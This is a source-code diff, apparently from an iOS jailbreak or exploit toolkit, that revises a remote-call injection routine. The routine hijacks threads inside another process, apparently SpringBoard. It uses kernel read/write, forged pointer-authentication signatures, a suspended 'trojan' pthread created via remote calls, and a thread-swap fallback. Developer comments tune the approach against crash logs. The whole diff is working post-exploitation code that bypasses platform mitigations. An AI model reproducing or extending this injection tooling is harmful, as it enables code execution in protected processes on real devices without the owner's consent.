@@ -2011,23 +2011,41 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
     bool createdSuspended = false;
 
     if (!ios26StubPthread) {
-        // Cyanide/Fl0rk: create IMMEDIATELY after bootstrap getpid.
-        // Prior path did malloc/memcpy/dlsym/dlopen/free BEFORE create — each
-        // remote call runs on the parked creator stack and can smash SP-0x100
-        // (log 16:32: always canary after that dance). Never unsigned sleep.
-        // start = remote_pac(0x301,0) same as Cyanide.
-        RC_DIAG("pthread_create_suspended_np start=pac_0x301 0x%llx out=SP-0x100=0x%llx (immediate)",
-                (unsigned long long)remoteCrashSigned,
+        // Immediate create after getpid (Cyanide). Never unsigned sleep.
+        // Log 16:48: pac_0x301 start + bounce read always canary, then MINHDUC+SB
+        // IPS. Two fixes:
+        // 1) start = remote_pac(strip(local getpid), 0) — accepted by libpthread
+        //    on 17.5.1 (sb-pac-sleep-pthread); pac_0x301 alone crashed SB.
+        // 2) bounce read: do NOT remote_write canary before memcpy — that
+        //    poisons VMShmem so remote_read64 returns our canary (false miss).
+        void *localGetpid = dlsym(RTLD_DEFAULT, "getpid");
+        uint64_t startRoutine = 0;
+        const char *startKind = "none";
+        if (localGetpid) {
+            startRoutine = remote_pac(g_RC_trojanThreadAddr,
+                                      native_strip((uint64_t)localGetpid), 0);
+            if (startRoutine && startRoutine != (uint64_t)-1)
+                startKind = "local_getpid_pac";
+            else
+                startRoutine = 0;
+        }
+        if (!startRoutine) {
+            startRoutine = remoteCrashSigned;
+            startKind = "pac_0x301";
+        }
+
+        RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=SP-0x100=0x%llx (immediate)",
+                startKind, (unsigned long long)startRoutine,
                 (unsigned long long)trojanMemTemp);
 
         uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
-                                                    trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
+                                                    trojanMemTemp, 0, startRoutine, 0, 0, 0, 0, 0);
         uint64_t pthreadAddr = 0;
         if (g_RC_success && createResult == 0) {
-            // Read *out via SB memcpy stack→heap (remap ≠ live stack page).
             uint64_t heapBounce = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
             if (g_RC_success && heapBounce) {
-                remote_write64(heapBounce, kCanary);
+                // Zero via SB memset — no KRW write to bounce (avoids shmem poison).
+                do_remote_call_temp(100, "memset", heapBounce, 0, 8, 0, 0, 0, 0, 0);
                 do_remote_call_temp(100, "memcpy", heapBounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
                 clear_remote_shmem_cache();
                 pthreadAddr = remote_read64(heapBounce);
@@ -2062,7 +2080,8 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                 callThreadPort = 0;
             }
         } else {
-            RC_DIAG("create miss/canary — falling through to thread[1] TRO-swap");
+            RC_DIAG("create miss (bounce=0x%llx) — falling through to thread[1] TRO-swap",
+                    (unsigned long long)pthreadAddr);
         }
     } else {
         RC_DIAG("iOS26+ pthread stubs — skipping create; trying thread[1] reuse");
